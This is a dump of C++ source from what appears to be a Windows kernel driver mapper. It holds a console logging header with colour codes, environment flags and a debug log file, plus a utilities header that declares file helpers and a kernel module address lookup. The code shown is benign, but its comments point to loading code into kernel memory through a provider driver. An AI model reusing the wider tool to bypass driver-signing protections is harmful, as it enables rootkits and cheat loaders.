#include <iostream>
#include <fstream>
#include <iterator>
#include <sstream>
#include <string>
#include <type_traits>

namespace Console
{
	/*
	 * Read an on/off environment variable.
	 *
	 * Accepts the spellings a user would actually type - 1, true, yes, on and
	 * their negatives - rather than the single leading character the old test
	 * compared against. AMEGER_NO_COLOR=10 and =true both used to enable colour,
	 * so the variable was very nearly the opposite of what it says.
	 */
	inline bool EnvironmentFlag(const wchar_t* name) {
		wchar_t value[16] = { 0 };
		const DWORD length = GetEnvironmentVariableW(name, value, static_cast<DWORD>(std::size(value)));
		//0 is "not set", at or above the buffer size is truncation: neither is a
		//value this can judge, and neither should be read as one.
		if (length == 0 || length >= std::size(value))
			return false;

		std::wstring text(value, length);
		for (wchar_t& c : text) {
			if (c >= L'A' && c <= L'Z')
				c = static_cast<wchar_t>(c - L'A' + L'a');
		}

		if (text == L"1" || text == L"true" || text == L"yes" || text == L"on")
			return true;
		if (text == L"0" || text == L"false" || text == L"no" || text == L"off")
			return false;

		//Something else entirely: not a request for the behaviour.
		return false;
	}

	//True when AMEGER_NO_COLOR asks for plain output. Read once, at first
	//use, so every colour below and EnableAnsiColors() agree on the answer.
	inline bool ColorsDisabled() {
		static const bool disabled = EnvironmentFlag(L"AMEGER_NO_COLOR");
		return disabled;
	}

	//True when AMEGER_VERBOSE asks for the per-entry diagnostics that would
	//otherwise flood the log (e.g. every restored page-table entry).
	inline bool Verbose() {
		static const bool verbose = EnvironmentFlag(L"AMEGER_VERBOSE");
		return verbose;
	}

	//The sequence itself, or an empty string when colour is disabled.
	inline const wchar_t* ColorOrPlain(const wchar_t* code) {
		return ColorsDisabled() ? L"" : code;
	}

	inline const wchar_t* const kReset = ColorOrPlain(L"\x1b[0m");
	inline const wchar_t* const kGreen = ColorOrPlain(L"\x1b[92m");
	inline const wchar_t* const kRed = ColorOrPlain(L"\x1b[91m");
	inline const wchar_t* const kYellow = ColorOrPlain(L"\x1b[93m");
	inline const wchar_t* const kCyan = ColorOrPlain(L"\x1b[96m");

	/*
	 * Turn on ANSI escape processing so the sequences above are drawn rather
	 * than printed literally.
	 *
	 * Idempotent and safe to call from several translation units: the mode is
	 * set once, the first time it is needed. It is a no-op under
	 * AMEGER_NO_COLOR=1 and when stdout is not a console (a redirected file
	 * keeps the bytes out of it entirely, so a log still reads as plain text).
	 */
	inline void EnableAnsiColors() {
		if (ColorsDisabled())
			return;

		static const bool enabled = [] {
			const HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE);
			if (console == INVALID_HANDLE_VALUE || console == nullptr)
				return true;

			DWORD mode = 0;
			if (!GetConsoleMode(console, &mode))
				return true;

			SetConsoleMode(console, mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
			return true;
		}();
		(void)enabled;
	}

	/*
	 * Diagnostic file mirror.
	 *
	 * The mapper logs through std::wcout (a wide stream) which does not reliably
	 * write to a redirected byte file, so a hung mapper left no trace. This lazily
	 * opens <appdir>\mapper_debug.log (truncated per run) and mirrors every line the
	 * console gets, so the last logged line shows exactly where the mapper blocked.
	 * Additive only - it does not change what the tool prints or does.
	 */
	inline HANDLE DebugFile() {
		static HANDLE file = INVALID_HANDLE_VALUE;
		if (file == INVALID_HANDLE_VALUE) {
			wchar_t modulePath[MAX_PATH] = { 0 };
			const DWORD length = GetModuleFileNameW(nullptr, modulePath, MAX_PATH);
			std::wstring path(L"mapper_debug.log");
			if (length > 0 && length < MAX_PATH) {
				const std::wstring full(modulePath, length);
				const size_t slash = full.find_last_of(L"\\/");
				if (slash != std::wstring::npos)
					path = full.substr(0, slash + 1) + L"mapper_debug.log";
			}
			file = CreateFileW(path.c_str(), GENERIC_WRITE, FILE_SHARE_READ,
				nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
		}
		return file;
	}

	inline void DebugStream() {
		(void)DebugFile();
	}

	inline void Mirror(const std::wstring& plain) {
		const HANDLE file = DebugFile();
		if (file == INVALID_HANDLE_VALUE || plain.empty())
			return;

		const int needed = WideCharToMultiByte(CP_UTF8, 0, plain.data(),
			static_cast<int>(plain.size()), nullptr, 0, nullptr, nullptr);
		if (needed <= 0)
			return;

		std::string utf8(static_cast<size_t>(needed), '\0');
		WideCharToMultiByte(CP_UTF8, 0, plain.data(), static_cast<int>(plain.size()),
			utf8.data(), needed, nullptr, nullptr);

		DWORD written = 0;
		WriteFile(file, utf8.data(), static_cast<DWORD>(utf8.size()), &written, nullptr);
	}

	//Widen an ASCII identifier. Every string the tool widens this way is a
	//narrow module, symbol or driver name, so a per byte copy is correct and
	//needs no locale.
	inline std::wstring ToWide(const char* text) {
		const std::string narrow(text ? text : "");
		return std::wstring(narrow.begin(), narrow.end());
	}

	//A value to print in green. Built by Val()/Hex(); streamed through the
	//operator below so the green span wraps exactly the value and nothing else.
	struct GreenText {
		std::wstring text;
	};

	inline std::wostream& operator<<(std::wostream& stream, const GreenText& value) {
		/* No Mirror() here: this operator also runs for values streamed into a
		 * std::wostringstream (buffer building), where mirroring would write the
		 * value to the file out of order. The Line's generic operator mirrors the
		 * whole value once, after it has been formatted. */
		return stream << kGreen << value.text << kReset;
	}

	//An integer as 0x-prefixed hexadecimal.
	template <typename T, std::enable_if_t<std::is_integral_v<T>, int> = 0>
	inline std::wstring Hex(T value) {
		std::wostringstream stream;
		stream << L"0x" << std::hex << value;
		return stream.str();
	}

	//Wrap a value so it prints green. A pointer prints as 0x-prefixed hex; an
	//integer prints in decimal, so Hex() is used where hex is wanted.
	inline GreenText Val(const std::wstring& text) { return GreenText{ text }; }
	inline GreenText Val(const wchar_t* text) { return GreenText{ text ? text : L"" }; }
	inline GreenText Val(wchar_t* text) { return GreenText{ text ? text : L"" }; }
	inline GreenText Val(const char* text) { return GreenText{ ToWide(text) }; }
	inline GreenText Val(const void* pointer) {
		//Formatted the same way as Hex() (lowercase, 0x-prefixed) rather than
		//with operator<<(void*), which on MSVC prints the C %p form: uppercase
		//and without the 0x that every other address in the output carries.
		std::wostringstream stream;
		stream << L"0x" << std::hex << reinterpret_cast<uintptr_t>(pointer);
		return GreenText{ stream.str() };
	}
	template <typename T, std::enable_if_t<std::is_integral_v<T>, int> = 0>
	inline GreenText Val(T value) { return GreenText{ std::to_wstring(value) }; }

	//Colour of a one character tag, or null when the tag is not one of ours.
	inline const wchar_t* TagColor(wchar_t tag) {
		switch (tag) {
		case L'+': return kGreen;
		case L'i': return kYellow;
		case L'!': return kCyan;
		case L'-': return kRed;
		case L'<': return kCyan;
		case L'*': return kCyan;
		default: return nullptr;
		}
	}

	//Write text, colouring a leading "[x]" tag when it is one of ours. "[!!]"
	//(the crash handler) and the six character "[INFO]" are treated as tags as
	//well. Text that carries no recognised tag is written unchanged.
	inline void WriteTagged(const std::wstring& text) {
		size_t tag_length = 0;
		const wchar_t* color = nullptr;

		if (text.size() >= 4 && text.compare(0, 4, L"[!!]") == 0) {
			tag_length = 4;
			color = kRed;
		}
		else if (text.size() >= 6 && text.compare(0, 6, L"[INFO]") == 0) {
			tag_length = 6;
			color = kYellow;
		}
		else if (text.size() >= 3 && text[0] == L'[' && text[2] == L']') {
			tag_length = 3;
			color = TagColor(text[1]);
		}

		if (!color) {
			std::wcout << text;
			Mirror(text);
			return;
		}

		std::wcout << color << text.substr(0, tag_length) << kReset << text.substr(tag_length);
		Mirror(text);
	}

	/*
	 * One log line. The Log macro builds a temporary Line and streams the
	 * caller's content into it, so the indent and the tag colour are applied in
	 * exactly one place. A Line with indent = false is the flush left variant
	 * used by the interactive prompt and the usage text.
	 */
	class Line {
	public:
		explicit Line(bool indent = true) : indent_(indent) {}

		Line& operator<<(const wchar_t* text) {
			Begin();
			WriteTagged(text ? text : L"");
			return *this;
		}

		Line& operator<<(const char* text) {
			Begin();
			WriteTagged(ToWide(text));
			return *this;
		}

		//A prebuilt line (e.g. one buffered so it can be printed after a value
		//it depends on). Without this overload the generic template below would
		//stream it raw and the leading tag would lose its colour.
		Line& operator<<(const std::wstring& text) {
			Begin();
			WriteTagged(text);
			return *this;
		}

		//std::endl and friends; resolved explicitly because a function
		//template cannot be deduced by the generic overload below.
		Line& operator<<(std::wostream& (*manipulator)(std::wostream&)) {
			Begin();
			std::wcout << manipulator;
			Mirror(L"\n");
			return *this;
		}

		//std::hex, std::dec and friends.
		Line& operator<<(std::ios_base& (*manipulator)(std::ios_base&)) {
			Begin();
			std::wcout << manipulator;
			return *this;
		}

		template <typename T>
		Line& operator<<(const T& value) {
			Begin();
			std::wcout << value;
			std::wostringstream buf;
			buf << value;
			Mirror(buf.str());
			return *this;
		}

	private:
		void Begin() {
			if (!started_) {
				if (indent_) {
					std::wcout << L"  ";
					Mirror(L"  ");
				}
				started_ = true;
			}
		}

		bool indent_ = true;
		bool started_ = false;
	};
}

//Indented, tag-coloured diagnostic line.
//
// Variadic rather than a single parameter: the single parameter form breaks on
//any top level comma in the argument, so a call that streamed two values as
//`a, b` - a pair, a ternary, a constructor call - did not compile, and the fix
//was to add parentheses at that call site rather than here. __VA_ARGS__ is the
//one spelling that treats the whole expression list as the stream argument.
#define Log(...) Console::Line() << __VA_ARGS__

//Flush left variant, for the interactive prompt and the usage text.
#define LogRaw(...) Console::Line(false) << __VA_ARGS__

//A bare blank line, used to separate output sections. Never indented.
#define LogBlank() (std::wcout << std::endl)

//Val()/Hex() are used unqualified at the call sites to keep them readable.
using Console::Val;
using Console::Hex;

```

### D:\Ameger\Mapper\Mapper\Utilities\Utilities.hpp â€” 34 lines â€” sha12:3094B36DCF69
```c-header
#pragma once

#include <Windows.h>
#include <cstddef>
#include <cstdint>
#include <string>
#include <vector>

/*
 * Helpers shared by the rest of the project. Nothing here touches kernel
 * memory: these all run before the provider is loaded or after it has been
 * unloaded.
 */
namespace Utilities
{
	//Widens an ASCII identifier. Kernel module names and export names are narrow
	//ASCII, so a per byte copy is correct and cheaper than a codepage conversion,
	//which would need a locale.
	std::wstring ToWide(const std::string& text);

	//%TEMP% with the trailing backslash removed, or an empty string on failure.
	std::wstring GetFullTempPath();

	//Slurp a file into out_buffer, replacing any previous contents.
	//Returns false when the file cannot be opened.
	bool ReadFileToMemory(const std::wstring& file_path, std::vector<BYTE>* out_buffer);

	//Write size bytes at address to desired_file_path, truncating it.
	//Returns false when the write fails.
	bool CreateFileFromMemory(const std::wstring& desired_file_path, const char* address, size_t size);

	//Base address of a loaded kernel module, matched case-insensitively on the
	//file name (e.g. "ntoskrnl.exe"). 0 when the module is not loaded.
	//Runs NtQuerySystemInformation(SystemModuleInformation), which needs no
	//special privilege.
	uint64_t GetKernelModuleAddress(const std::string& module_name);

	//Folder containing the running executable, without a trailing separator.
	//Used to locate Offsets.ini and SymbolTool.exe next to Mapper.exe.
	std::wstring GetCurrentAppFolder();
}

```

